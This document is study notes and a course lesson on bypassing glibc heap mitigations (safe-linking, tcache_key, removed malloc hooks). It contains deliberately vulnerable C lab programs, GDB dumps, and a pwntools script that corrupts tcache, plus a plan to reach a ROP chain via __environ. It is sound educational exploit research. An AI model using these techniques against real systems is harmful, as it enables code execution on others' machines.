
# Personal Notes
Search these up:
- libc's `main_arena` symbol
	- something about the addr dumped for this symbol is not actually its address, but 10 bytes before/after it?
- why do we care about `environ` symbol? How is it used in exploits?

Useful facts:
- pages 
	- smallest allocated memory unit in virtual memory
		- 0x1000 bytes aligned? 
		- This is why major sections in a program like the heap or stack begin at memory addresses that end in 0x000
	- Significance:
		- Break ASLR
			- leak the addr of a fw pointer (mangled by safe-linking), shift it back << 12 bits. It won't be the actual mem addr of the next chunk, but it might tell us about the base address of the heap
- 



# Full Notes

Last lesson was a fire-hose of heap information, culminating with our first glibc cache poisoning exploit. The reason these two lessons are differentiated is because the heap is often at the forefront of the exploit developer versus security engineer cat and mouse game. We can see the evolution of this game documented in [How2Heap](https://github.com/shellphish/how2heap), an amazing heap exploitation resource maintained by the Shellphish CTF team out of Arizona State University. Certain strategies, such as overlapping chunks or House of Orange, have been successfully mitigated (for now) in new versions of glibc. But cache poisoning is a pervasive threat, and the glibc developers made two big upgrades in the past few versions.

This lesson covers those changes introduced in glibc 2.32 and 2.34, first outlining how and why they work. Then we will consider exploitation strategies for bypassing the new checks, as we continue the cat and mouse game as the role of exploit developer. We'll see how, with certain heap control, we can circumvent these mitigations to leverage the UAF, overflow, and tcache poisoning techniques we learned last lesson.

These bypasses work on latest glibc, meaning these attacks as _viable against modern, real world targets_. These are incredibly important techniques to add to our vulnerability research toolkit, and will benefit us when researching a variety of systems.

## Safe-Linking: how tcache nodes point to each other
### Summary
- Problem: tcache poisioning, where we mess with the pointers to freed memory chunks inside the tcache (singly linked list)
- This solution: "safe-linking"
	- tcache does not store raw addresses. It mangles the addresses - "encrypts" it - and then store it. This means when you dump the tcache, you won't see the actual addrs to the freed memory chunks
		- How does the "encryption" work?
			- You have an address to encrypt. 
			- Bit shift >> 12 bits 
			- Then XOR it with the address of the next memory chunk (lives on heap) in the tcache linked list
- Confusion on addr
	- Addr of the memory chunks (on heap)! Not addr of the variables which contains these addrs.
- Illuminating facts
	- "We saw how tcache stored the `fw` pointer in the first eight bytes of a freed allocation"
		- the fw pointer is literally part of the memory chunk. wow. Part of its metadata
- Significance for exploits / why do we need to know this?? 
	- Context: tcache poisoning - you inject malicious pointers 
		- Specifics: exploit could be overwriting a node's `fw` pointer to point to malicious code
		- But now, with safe-linking, the `fw` pointer points NOT to the addr of the next memory chunk directly, but that after mangling (bit shift then XOR).
		- This means that we need to do the safe-linking "encryption" to the malicious code addr before we corrupt the `fw` pointers
		- How to?
			- for a memory chunk (in tcache) whose fw pointer you want to poison to point to addr X:
				- make fw pointer = (this chunk's addr >> 12) XOR addr X






> We need to ensure that our system uses a glibc version greater than or equal to 2.34 for the following examples. As of July 2024, the Ubuntu 22.04 OS is a suitable, easy option for a research environment. Again, check the glibc version using `ldd --version`, as shown below:

```console
ldd --version
Output: ldd (Ubuntu GLIBC 2.38-1ubuntu6.3) 2.38
```


The first mitigation, introduced in glibc 2.32, is specifically targeted at stopping tcache poisoning. _Safe-linking_ is a new process used when caching tcache and fastbins allocations to prevent leaking and corrupting linked list pointers. Let's take a look at how it works.

We saw previously that both tcache and fastbins cached allocations have a `fw` linked list pointer; the end (tail) of the cache has a null pointer, and the rest of the items point to the next freed allocation in the cache. We first abused this design choice by leaking cached pointers to the heap (using a UAF or cleverly using a recently reallocated pointer that was not initialized). We then went even further, leveraging the pointers to corrupt the cache and return arbitrary memory for later use. Safe-linking protects against this by "encrypting" these linked list pointers.

The term "encrypting" here is used loosely—any full-fledged encryption like AES would have a significant performance impact. Instead, glibc developers opted for a quick yet effective solution: bit shifts and bitwise XORs.

[The following code](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/malloc/malloc.c#L329) performs safe-linking "encryption" when we add a new allocation to the linked list. The value returned from this macro is used as the `fw` pointer in the new allocation. 

```c
/* Safe-Linking:
   Use randomness from ASLR (mmap_base) to protect single-linked lists
   of Fast-Bins and TCache.  That is, mask the "next" pointers of the
   lists' chunks, and also perform allocation alignment checks on them.
   This mechanism reduces the risk of pointer hijacking, as was done with
   Safe-Unlinking in the double-linked lists of Small-Bins.
   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
   larger pages provide less entropy, although the pointer mangling
   still works.  */
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
```

The `pos` argument can be thought of as _this_, meaning the allocation glibc is currently freeing. The `ptr` argument is the _next_ allocation in the list. We see that the macro performs two operations: it shifts the address of _this_ allocation by 12 bits to the right and XORs the result with the _next_ cache allocation's address. The bit shift combined with the XOR means that a lot of the resulting address is garbled. For instance, let's take a look at the prior [[tcache]] example in GDB on a system using glibc 2.32+:

```
──────────────────────────── Tcachebins for thread 1 ───────────────────────────
Tcachebins[idx=3, size=0x50, count=7] ←  Chunk(addr=0x555555559480, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559430, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555593e0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559390, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559340, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555592f0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555592a0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
───────────────────── Fastbins for arena at 0x7ffff7dfeca0 ──────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────── Unsorted Bin for arena at 0x7ffff7dfeca0 ────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────── Small Bins for arena at 0x7ffff7dfeca0 ─────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────── Large Bins for arena at 0x7ffff7dfeca0 ────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

We see that `gef` automatically resolves the pointer addresses for us by "decrypting" the pointers (we'll cover how in a moment), which is very handy. However if we dump the actual bytes at each cached allocation, we see the `fw` value does not look much like a valid pointer:

```
gef➤  x/2xg 0x555555559480
0x555555559480:	0x000055500000c169	0x3fbe1b1ef8578942
gef➤  x/2xg 0x555555559430
0x555555559430:	0x000055500000c6b9	0x3fbe1b1ef8578942
```

When a cached allocation is fetched from a bin, the system "decrypts" the pointer to get the _actual_ `fw` pointer to store as the new head of the list. The operations are actually done using the same macro, just with different arguments. 

```c
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

The argument to `REVEAL_PTR` is the `fw` pointer, making `&ptr` equal to the _this_ address for the given allocation and `ptr` equal to the encrypted data in `fw`. The current address is again shifted by 12 bits to the right and again XOR'd, but this time with the value in `fw`. Because XOR is an associative operation, the result is the unencrypted address of the next cached item. We can perform this manually to verify that it works:

```
gef➤  x/2xg 0x555555559430
0x555555559430:	0x000055500000c6b9	0x3fbe1b1ef8578942
gef➤  p/x (0x555555559430 >> 12) ^ 0x000055500000c6b9
$1 = 0x5555555593e0
```

Now that we understand how it works, we might conclude that this is concerning! Without the address of _this_, a leaked "encrypted" address is meaningless. And without a heap address we cannot corrupt the cache in a meaningful manner such that our desired address is "decrypted" successfully. This is quite the conundrum!

## Bypassing Safe-linking

### Getting a Leak

We'll work through these two problems now, starting with leaking a meaningful address. Sure, leaking an encrypted `fw` pointer in the middle of the linked list, like we did last lesson, does not provide us much. Without knowing one of the two addresses involved in the encryption, we're at a loss. But there is one `fw` pointer that is not like the others: the tail pointer! Remember that this is a null pointer in glibc <2.32, marking the end of the list. Let's go through the encryption routine knowing that `null` is next. Say we have a _this_ pointer of `0x123456789a0`:

```python
hex((0x123456789a0 >> 12) ^ 0)
# prints '0x12345678'
```

The "encrypted" pointer is the address, less the bottom 12 bits! This makes sense as `X ^ 0 = X`. We're missing some data, but if we shift the leaked value left by 12 bits we essentially leak the _page's address_ that the given allocation resides on (since pages are, by default, `0x1000` bytes aligned). We could brute force the remaining bits (there are only 2^8 or 256 combinations, as we know the last 4 bits must be 0 for the allocation to be 16-byte aligned), but brute forcing during an exploit will likely lead to a crash if we guess wrong. However, if we're strategic we do not need brute forcing.

Consider a relatively inactive heap, such as the examples we've worked on thus far. If we have an average allocation size of, say, `0x60` bytes, we can fit ~35 allocations on the first page (`0x1000` bytes) of the heap (including `0x290` bytes for `tcache_perthread_struct`). If we're fairly confident the cached allocation is in one of those first allocations then we can assume it resides on the first page of heap memory. If that's the case, we can leak not only the allocation's page address, but _the start of the heap_! Better yet, if we are the only user of the system, and thus have control over the sequence of heap allocations, we can identify, with rather high certainty, the exact position of this allocation on the page. Combining its page offset with the leaked page starting address, we can calculate its exact address.

Let's take a look at how to do this in practice, with the following [[safe_linking_leak.c |`safe_linking_leak.c`]].

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

int main() {
    long long* a = malloc(0x20);
    printf("Address of a:                       %p\n", a);
    printf("Address of heap starting address:   0x%llx\n",
		   ((long long)a & ~0xfff));
    free(a);
    printf("Encrypted pointer:                     0x%llx\n", *a);
    printf("Encrypted pointer shifted:          0x%llx\n", (*a) << 12);
    return 0;
}
```

Running [[safe_linking_leak]] in GDB and jumping to the end of main prints the addresses, and we can confirm with `gef`'s `heap chunks` that the printed value shifted 12 bits to the left is, in fact, the start of the heap! _Note: the address of `tcache_perthread_struct` starts `0x10` bytes after the start of the heap because its size and `FLAGS` metadata precedes it_.

```
$ gdb safe_linking_leak
gef➤  b *(main + 168)
gef➤  c
Address of a:                       0x5555555592a0
Address of heap starting address:   0x555555559000 🟡 THEY MATCH!
Encrypted pointer:                     0x555555559
Encrypted pointer shifted:          0x555555559000 🟡 THEY MATCH!
gef➤  heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     59 55 55 55 05 00 00 00 1c 93 96 ba 6e 58 35 30    YUUU........nX50]
Chunk(addr=0x5555555592d0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592d0     45 6e 63 72 79 70 74 65 64 20 70 6f 69 6e 74 65    Encrypted pointe]
Chunk(addr=0x5555555596e0, size=0x20930, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
gef➤  x/xg 0x00005555555592a0
0x5555555592a0:	0x0000000555555559
```

We know that the first allocation, `a`, is `0x2a0` bytes into the heap on each run and thus we can calculate its address using a leak of the heap's starting address!

> It's worth noting that two big assumptions must hold in order to use these strategies. First, the heap must not be "busy." If our target allocates a ton of heap data for every interaction, it is possible that our allocations (and thus leaked data) is not on the first page of heap memory. That said, if we can reliably end up on any `n`th page, we can use the same logic to calculate the heap base by subtracting `n * 0x1000`. The second assumption is that the heap is only affected by our interactions. In a live target, say a web server, this very well may not be the case. Furthermore, the heap might already have in-use and freed allocations before we even start interacting with it. In situations like these, we would rely on _heap spraying_ to increase our odds of success. Heap spraying is outside the scope of this course, but in short it is a strategy of making thousands of allocations in quick succession to increase the chance of deterministic behavior. The goal is to empty caches so that subsequent allocations are next to one another, thereby increasing the chance that a buffer overflow or UAF lands on an allocation we desire.

### Corrupting Tcache

Now that we have a viable leak, we can progress to the next step of corrupting tcache. This is not as simple as the <2.32 versions, as we need to know not only our target address, but also the address of the cached allocation which is being corrupted. For this, we again need to visualize the heap.

Consider the following [[safe_linking_corruption.c]] example, which extends the UAF leak we had in the prior example with an opportunity to corrupt the linked list pointer in `b`. Remember that we must corrupt the pointer in `b`, not `a`, because `a` is the tail. When tcache gets to the tail of a bin, its counter is zero and the pointer in `fw` is ignored. 

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

int main() {
    long long* a = malloc(0x20);
    char* b = malloc(0x20);
    free(a);
    free(b);
    // leak the heap starting address
    printf("Encrypted pointer: 0x%llx\n", *a);
    // leverage UAF to corrupt the top of the linked list
    fgets(b, 0x10, stdin);
    a = malloc(0x20);
    // get the corrupted allocation from tcache
    b = malloc(0x20);
    printf("B is allocated at: %p\n", b);
    // read into new b buffer
    read(0, b, 0x10);
    return 0;
}
```

In order to corrupt `b` we need to know its address. We know that it is in the first page of the heap and thus can find its offset by quickly running [[safe_linking_corruption]] in GDB and breaking after the allocations.

```
gef➤  heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     59 55 55 55 05 00 00 00 52 21 fa f5 52 6b 73 d6    YUUU....R!..Rks.]
Chunk(addr=0x5555555592d0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592d0     f9 c7 00 00 50 55 00 00 52 21 fa f5 52 6b 73 d6    ....PU..R!..Rks.]
Chunk(addr=0x555555559300, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559300     45 6e 63 72 79 70 74 65 64 20 70 6f 69 6e 74 65    Encrypted pointe]
Chunk(addr=0x555555559710, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559710     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555559b20, size=0x204f0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```

We see that the second `0x30` representing `b` is at an offset of `0x2d0` from the top of the heap. Now we're ready to do our corruption. Say our target is allocating the top of the heap to corrupt `tcache_perthread_struct`'s metadata. We can successfully corrupt the heap by writing the value of `(b >> 12) ^ heap_base` to the cached pointer in `b`. A solver script to do this is shown below:

```python
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-h", "-f"]

B_OFFSET = 0x2d0

p = gdb.debug("./safe_linking_corruption", '''
    b *(main + 200)
    continue
''')

# handle leak
p.recvuntil(b": ")
leak = int(p.recvline(), 16)
heap_base = leak << 12
b = heap_base + B_OFFSET
print("Heap base address: " + hex(heap_base))
print("b address:         " + hex(b))

# prepare and send encrypted pointer to corrupt tcache
encrypted = (b >> 12) ^ heap_base
p.sendline(p64(encrypted))

# corrupt the targeted memory!
p.recvline()
p.send(b'AAAAAAAAAAAAA')

p.interactive()
```

After sending the corrupted pointer, we send a bunch of `A`s to see if the overwrite succeeds. Breaking on `main`'s `leave` instruction and dumping heap memory confirms that `gef`'s heap parsing is very confused (as it should be), and that we corrupted the top of the heap with all `A`s!

```
──────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5591e0477282 <main+00b9>      mov    edi, 0x0
   0x5591e0477287 <main+00be>      call   0x5591e04770b0 <read@plt>
   0x5591e047728c <main+00c3>      mov    eax, 0x0
 → 0x5591e0477291 <main+00c8>      leave  
   0x5591e0477292 <main+00c9>      ret    
   0x5591e0477293                  add    bl, dh
   0x5591e0477295 <_fini+0001>     nop    edx
   0x5591e0477298 <_fini+0004>     sub    rsp, 0x8
   0x5591e047729c <_fini+0008>     add    rsp, 0x8
──────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "safe_linking_co", stopped 0x5591e0477291 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5591e0477291 → main()
─────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunks
Chunk(addr=0x5591e1236010, size=0x4141414140, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005591e1236010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
gef➤  x/10xg 0x5591e1236000
0x5591e1236000: 0x4141414141414141      0x0000004141414141
```

We can extend this primitive to any target address just as we did tcache corruption in the prior lesson. So, now we should be able to perform the same `__free_hook` corruption method to pop a shell right?

## RIP `__free_hook`

Unfortunately, we must lay to rest one of our closest friends, `__free_hook`. In fact, we must also say goodbye to its friends `__malloc_hook` and `__realloc_hook`. After years of exploit developers and CTF players abusing these hooks, the [glibc developers decided](https://developers.redhat.com/articles/2021/08/25/securing-malloc-glibc-why-malloc-hooks-had-go) it was likely better for security to remove them by default, starting in glibc 2.34. The symbols still exist and  preloading a specific malloc debug library will re-enable them, but in most cases they are simply inert. This is a significant blow to the exploit strategy we learned last lesson, as `__free_hook` presented a clever way to hijack execution flow when we already had some level of heap control.

### Alternatives

Our tcache corruption primitive is essentially an arbitrary write primitive, so we can hijack execution flow with any strategy we previously covered. For instance, a GOT overwrite to a one-gadget would suffice, if we're targeting a Partial RELRO binary. But for the sake of example, let's demonstrate how to use a strategy briefly mentioned in [[7. Return-Oriented Programming]]: leveraging glibc's `__environ` variable to hijack the stack for a ROP chain.

Remember that ROP chains require two things: PC and stack control. If we have an arbitrary write primitive and know a stack address, we can use that primitive to write ROP gadgets to the stack. If we have an arbitrary write primitive and know the address of _a pushed return instruction pointer_, we can hijack PC with a ROP chain. Tcache corruption gives us the ability to write bytes at an address we choose, so we just need to find some stack addresses.

That's where `__environ` comes in. The symbol, which points to an array of environment variable strings, is defined and exported in glibc and imported in the linker/loader `ld`. The arguments to `main` (`argc, argv, envp`) are all stored on the stack above `main`'s stack frame. The `__environ` variable stores the stack address where `envp` resides. Therefore, if we can leak that address, we have a stack address _above_ `main`'s stack frame. `main`'s stack frame is always a deterministic distance from `envp`, so we can find the address of `main`'s return pointer, just like we did in the ROP lesson, with some simple subtraction!

So how do we leak the address in `__environ`? First, we need to break ASLR for glibc since that is where the variable resides. We know how to do this from last lesson by leveraging unsorted bins/smallbins/largebins and the glibc `main_arena` pointers in their linked lists. It's important to ask whether safe-linking protects those pointers, and the answer is no! *We can use the exact same leak primitives leveraged for <2.32 targets to break ASLR for glibc.*

`__environ`'s address is simply an offset from glibc's base address once ASLR is broken. But how do we leak its value? Presumably we have a vulnerability allowing us to poison tcache. If we have a UAF or can keep a new, previously cached allocation uninitialized, we can use tcache corruption to allocate `__environ` and read its value! This is a new step in our exploit strategy but is fundamentally no different than leaking a glibc or heap address in prior steps—it just requires tcache poisoning first to leak an arbitrary address.

> As noted in [[7. Return-Oriented Programming]] and above, the linker/loader imports `__environ` as an external variable. Consequently, GDB does not know which address to print when we ask for `p/x &__environ`. The _value_ of both is the same, as it is a single variable exported to a different library. But `gdb` generally prints `ld`'s exported variable address, which should not be used to manually calculate an offset from glibc's base address. Using `pwntools.elf.ELF` or a command line utility like `readelf` is a reliable way to ensure we get the offset of `__environ` in glibc, not `ld`.

With the value of `__environ`, we know a stack address above `main`'s stack frame. We can easily calculate the distance between `main`'s return pointer and the leaked stack address. For the prior [[safe_linking_corruption]] example, we can simply break after the prologue and perform the calculations in GDB:

```console
$ gdb safe_linking_corruption
gef➤  b main
Breakpoint 1 at 0x11d1
gef➤  r
gef➤  x/2xg $sp
0x7fffffffe180:	0x0000000000000001	0x00007ffff7c28150
gef➤  x/3i 0x00007ffff7c28150
   0x7ffff7c28150 <__libc_start_call_main+128>:	mov    edi,eax
   0x7ffff7c28152 <__libc_start_call_main+130>:	call   0x7ffff7c452c0 <__GI_exit>
   0x7ffff7c28157 <__libc_start_call_main+135>:	call   0x7ffff7c94610 <__GI___nptl_deallocate_tsd>
gef➤  x/xg &__environ
0x7ffff7ffe2c0 <environ>:	0x00007fffffffe2a8
gef➤  p/x 0x00007fffffffe2a8-0x7fffffffe188
$1 = 0x120
```

By pivoting back to our trusty tcache corruption primitive, we can presumably force the allocation of a stack address, starting with the pushed instruction pointer. If we write a ROP chain to this buffer, we are in an identical situation to a stack buffer overflow (but have bypassed the stack canary mitigation!) to hijack control. All we need is to trigger a return from `main` to hit the ROP chain!

 > This tactic could be used for any stack frame, not just `main`, so long as the stack frame is in use from the time of allocation to the time of corruption. We will see how to do this in our upcoming [[#Practical Example|practical example]].

## Tcache Key

There is another update to tcache that goes hand-in-hand with safe-linking. We saw how tcache stored the `fw` pointer in the first eight bytes of a freed allocation and the address of `tcache_perthread_struct` in the next eight bytes. The purpose of `tcache_perthread_struct`'s address was to flag items that were double-freed—if an allocation passed to free had these bytes stored in its second quadword then it was likely freed twice without being reallocated from the cache. 

Glibc now stores eight randomized bytes called `tcache_key` in this second quadword. [`tcache_key`](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/malloc/malloc.c#L3127) is randomized for each process and stays the same throughout execution. Glibc source code below shows this randomization and how it is stored into newly cached allocations:

```c

/* Process-wide key to try and catch a double-free in the same thread.  */
static uintptr_t tcache_key;

/* The value of tcache_key does not really have to be a cryptographically
   secure random number.  It only needs to be arbitrary enough so that it does
   not collide with values present in applications.  If a collision does happen
   consistently enough, it could cause a degradation in performance since the
   entire list is checked to check if the block indeed has been freed the
   second time.  The odds of this happening are exceedingly low though, about 1
   in 2^wordsize.  There is probably a higher chance of the performance
   degradation being due to a double free where the first free happened in a
   different thread; that's a case this check does not cover.  */
static void
tcache_key_initialize (void)
{
  /* We need to use the _nostatus version here, see BZ 29624.  */
  if (__getrandom_nocancel_nostatus (&tcache_key, sizeof(tcache_key),
				     GRND_NONBLOCK)
      != sizeof (tcache_key))
    {
      tcache_key = random_bits ();
#if __WORDSIZE == 64
      tcache_key = (tcache_key << 32) | random_bits ();
#endif
    }
}

/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache_key;

  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

We can see it in action by dumping freed allocations memory in GDB, such as the following example where `0x563bd413b760` and `0x563bd413b780` are cached allocations with key `0x51712977a8607269`.

```
gef➤  x/10xg 0x563bd413b760
0x563bd413b760: 0x0000000563bd413b      0x51712977a8607269
0x563bd413b770: 0x0000000000000000      0x0000000000000021
0x563bd413b780: 0x0000563eb7aef65b      0x51712977a8607269
0x563bd413b790: 0x0000000000000000      0x0000000000000511
0x563bd413b7a0: 0x0000000000000000      0x0000000000000000
```

It's also important to note that items retrieved from tcache have this [second quadword nulled-out](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L3191), which is important for the double free check—if it was not nulled out then any `free; malloc; free` sequence that did not update the second eight bytes of the allocation would trigger a double free error.

```c
static __always_inline void *
tcache_get_n (size_t tc_idx, tcache_entry **ep)
{
  tcache_entry *e;
  if (ep == &(tcache->entries[tc_idx]))
    e = *ep;
  else
    e = REVEAL_PTR (*ep);

  if (__glibc_unlikely (!aligned_OK (e)))
    malloc_printerr ("malloc(): unaligned tcache chunk detected");

  if (ep == &(tcache->entries[tc_idx]))
      *ep = REVEAL_PTR (e->next);
  else
    *ep = PROTECT_PTR (ep, REVEAL_PTR (e->next));

  --(tcache->counts[tc_idx]);
  e->key = 0; // nulled out HERE
  return (void *) e;
}
```

Understanding `tcache_key` is important for two reasons. First, consider the scenario where we have a leak of a cached allocation's second quadword through a UAF. In versions of glibc <2.32 we could use this leak to leak `tcache_perthread_struct`, thereby breaking ASLR for the heap! But unfortunately in versions 2.32+ this will just leak `tcache_key`, a random 64-bit number. 

Unfortunately, this same UAF cannot be used with tcache corruption to leak any bytes in memory—we could try poisoning tcache to `desired_address - 0x8` to leak the value at `desired_address`. But, the process of nulling-out the second quadword during tcache allocation unfortunately clobbers the value at `desired_address`, preventing a successful leak.

> This behavior was actually the same in glibc <2.32 because `tcache_get` [would null-out the `tcache_perthread_struct` address in the returned data](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L2939). However, it is worth mentioning here because `__environ`'s address might not be 16-byte aligned, which means we must poison tcache to retrieve a pointer `0x8` bytes before it. Unfortunately, fetching this pointer from the poisoned cache clobbers the value in `__environ`, ruining our leak strategy.

## Smallbins and Largebins

Before we go into a practical example to demonstrate bypassing the new mitigations, let's talk about the structure of smallbins and largebins. Smallbins and largebins are the typical destinations for freed allocations in unsorted bins once glibc triggers a sort. As previously mentioned, sorting occurs when tcache and fastbins [fail to satisfy an allocation request](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4047). An easy way to trigger sorting is to request a size larger than any freed allocation in the current caches.

Like unsorted bins, smallbins and largebins cached allocations are doubly linked lists with the head and tail pointing back to `main_arena->bins`. This makes them another viable target to break ASLR for glibc via a cached pointer leak. However, the structure of a cached smallbins and largebins allocation has one key difference. 

Let's take a look at what the data actually looks like in memory, since glibc source code can be rather confusing. We'll use the following program, [[small_and_largebins.c]]:

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"
#include "string.h"
#include "stdbool.h"

// compile with `gcc small_and_largebins.c -o small_and_largebins -g`

int main() {
    void* tcache[7];
    // need to fill tcache for a smallbins size
    for (int i = 0; i < 7; i++) {
        tcache[i] = malloc(0x200);
    }
    // allocate a allocation that will eventually be sorted to smallbins
    void* small = malloc(0x200);
    // allocate a barrier between small and large allocation so that they do
    // do not consolidate
    void* barrier1 = malloc(0x10);
    // allocate an allocation that will be sorted into largebins
    void* large = malloc(0x800);
    // allocate a final barrier so that the large allocation does not
    // consolidate into top chunk
    void* barrier2 = malloc(0x10);
    // fill tcache
    for (int i = 0; i < 7; i++) {
        free(tcache[i]);
    }
    // free small allocation, will end up in unsorted bins
    free(small);
    // free large allocation, will end up in unsorted bins
    free(large);
    // allocate an allocation that cannot be filled by any cache, force sorting
    malloc(0x900);
    return 0;
}
```

Let's open [[small_and_largebins]] in GDB and set a breakpoint right after we `free` `small` and `large`.  What we see is that both are placed in unsorted bins (with `large` as the head and `small` as the tail). The small `0x200` allocation is a tcache-able size, but tcache is full from the prior `free`s. Fastbins only goes up to `0x80` bytes, so this allocation falls into unsorted bins. The `0x800` size allocation is too large to fit in tcache so it, by default, hits unsorted bins.

```
gef➤  heap bins
─────────────────── Unsorted Bin for arena at 0x7ffff7dfeca0 ────────────────────
[+] unsorted_bins[0]: fw=0x55555555a330, bk=0x55555555a100
 →   Chunk(addr=0x55555555a340, size=0x810, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x55555555a110, size=0x210, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in unsorted bin.
──────────────────── Small Bins for arena at 0x7ffff7dfeca0 ─────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────── Large Bins for arena at 0x7fc75f5feca0 ────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

We can make an allocation larger than anything currently cached to trigger a sort. If we advance past the `malloc(0x900)` call, we see the result is two sorted allocations!

```
gef➤  heap bins
──────────────────── Small Bins for arena at 0x7ffff7dfeca0 ─────────────────────
[+] small_bins[32]: fw=0x55555555a100, bk=0x55555555a100
 →   Chunk(addr=0x55555555a110, size=0x210, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in 1 small non-empty bins.
───────────────────── Large Bins for arena at 0x7fc75f5feca0 ────────────────────
[+] large_bins[79]: fw=0x55555555a330, bk=0x55555555a330
 →   Chunk(addr=0x55555555a340, size=0x810, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in 1 large non-empty bins.
gef➤  x/4xg 0x55555555a110
0x55555555a110:	0x00007ffff7dfef00	0x00007ffff7dfef00
0x55555555a120:	0x0000000000000000	0x0000000000000000
gef➤  x/4xg 0x55555555a340
0x55555555a340:	0x00007ffff7dff1f0	0x00007ffff7dff1f0
0x55555555a350:	0x000055555555a330	0x000055555555a330
```

We see both of them point into glibc with their `fw` and `bk` pointers, just like unsorted bins. But there is something different about the largebins allocation—the following two quadwords point to an address `0x10` bytes before the allocation:

```
gef➤  x/6xg 0x000055555555a330
0x55555555a330:	0x0000000000000000	0x0000000000000811
0x55555555a340:	0x00007ffff7dff1f0	0x00007ffff7dff1f0
0x55555555a350:	0x000055555555a330	0x000055555555a330
```

This is actually a feature of all allocations, as we see in the definition for [`malloc_chunk` in glibc](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L1145).

```c
/*
  This struct declaration is misleading (but accurate and necessary).
  It declares a "view" into memory allowing access to necessary
  fields at known offsets from a given base. See explanation below.
*/

struct malloc_chunk {

  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

